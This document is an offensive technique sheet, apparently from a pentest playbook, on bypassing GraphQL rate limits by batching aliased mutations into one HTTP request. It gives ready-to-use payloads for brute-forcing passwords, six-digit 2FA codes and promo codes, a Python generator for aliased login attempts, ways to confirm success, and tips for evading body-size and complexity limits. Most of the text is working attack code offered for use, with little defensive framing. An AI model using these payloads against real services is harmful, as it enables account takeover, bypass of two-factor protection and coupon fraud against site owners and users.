# GraphQL Rate Limit Bypass via Aliases

## When this applies

- Server-side rate limiter counts HTTP REQUESTS, not GraphQL OPERATIONS.
- You want to brute-force passwords, 2FA codes, or coupon codes faster than the rate limit allows.
- Single-request payload size limit is large enough to fit hundreds of aliased mutations.

## Technique

Pack 100+ aliased mutations into ONE HTTP request. Each alias is an independent operation but they share the request-level rate limit budget. The rate limiter sees one HTTP hit; the resolver runs N attempts.

**Why it works**: Rate limiters count HTTP requests, not GraphQL operations.

## Steps

### Alias-based brute force

```graphql
# 10 attempts in one request
mutation {
  attempt0: login(input: {username: "carlos", password: "123456"}) { token success }
  attempt1: login(input: {username: "carlos", password: "password"}) { token success }
  attempt2: login(input: {username: "carlos", password: "12345678"}) { token success }
  attempt3: login(input: {username: "carlos", password: "qwerty"}) { token success }
  attempt4: login(input: {username: "carlos", password: "abc123"}) { token success }
  attempt5: login(input: {username: "carlos", password: "monkey"}) { token success }
  attempt6: login(input: {username: "carlos", password: "letmein"}) { token success }
  attempt7: login(input: {username: "carlos", password: "trustno1"}) { token success }
  attempt8: login(input: {username: "carlos", password: "dragon"}) { token success }
  attempt9: login(input: {username: "carlos", password: "baseball"}) { token success }
}
```

### 2FA / OTP brute force

```graphql
mutation {
  verify0: verify2FA(code: "000000") { success }
  verify1: verify2FA(code: "000001") { success }
  verify2: verify2FA(code: "000002") { success }
  # ... continue to 999999
}
```

### Coupon / promo code testing

```graphql
mutation {
  promo1: applyPromoCode(code: "SAVE10") { discount }
  promo2: applyPromoCode(code: "SAVE20") { discount }
  promo3: applyPromoCode(code: "SAVE30") { discount }
  # ... test many codes
}
```

### Python — generate aliased mutation

```python
def generate_alias_mutation(username, passwords):
    """Generate aliased brute force mutation"""
    mutation = "mutation{\n"
    for i, password in enumerate(passwords):
        mutation += f'  attempt{i}:login(input:{{username:"{username}",password:"{password}"}})'
        mutation += '{token success}\n'
    mutation += "}"
    return mutation

passwords = ["password", "123456", "admin", "letmein"]
payload = generate_alias_mutation("carlos", passwords)
print(payload)
```

## Verifying success

- One of the aliased responses contains a token / `success: true`.
- HTTP status remains 200 (no rate-limit 429).
- Response time scales linearly with alias count — confirming the resolver ran each attempt.

## Common pitfalls

- Some servers add operation-level rate limiting (Apollo + plugins) — alias attacks fail there. Detect by error message `"Too many operations"`.
- Body size limits may cap aliases ~500 — chunk the wordlist into several requests.
- GraphQL parsing complexity may time out — split into batches of 100.

## Tools

- Burp Suite Repeater
- graphql-cop (built-in alias attack)
- Python script generators
- InQL Scanner BApp
